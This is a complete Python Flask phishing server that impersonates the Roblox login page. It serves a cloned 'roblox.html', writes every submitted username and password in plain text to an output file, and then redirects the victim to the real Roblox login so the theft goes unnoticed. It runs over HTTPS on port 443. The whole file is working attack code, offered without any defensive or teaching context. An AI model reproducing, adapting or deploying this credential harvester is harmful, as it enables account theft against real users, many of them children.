from flask import *
import ssl

app = Flask(__name__)

# API Endpoint for Index-Page
@app.route("/", methods=['GET', 'POST'])
def index():
    if request.method == 'GET':
        return render_template('roblox.html')
    if request.method == 'POST':
        return render_template('roblox.html')

# API Endpoint for styling files
@app.route('/roblox_files/<path:filename>')
def serve_roblox_file(filename):
    return send_from_directory('/app/roblox_files/', filename)

# API Endpoint to store creds and redirect user
@app.route('/api/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('/output/output.txt', 'a') as file:
        file.write(f'------------------------------------\n\nUsername: {username}\nPassword: {password}\n\n')

    return redirect('https://www.roblox.com/login')

# Generation of ssl cert
def generate_ssl_context():
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    ssl_context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
    return ssl_context

if __name__ == '__main__':
    ssl_context = generate_ssl_context()
    app.run(host="0.0.0.0", port=443, ssl_context=ssl_context)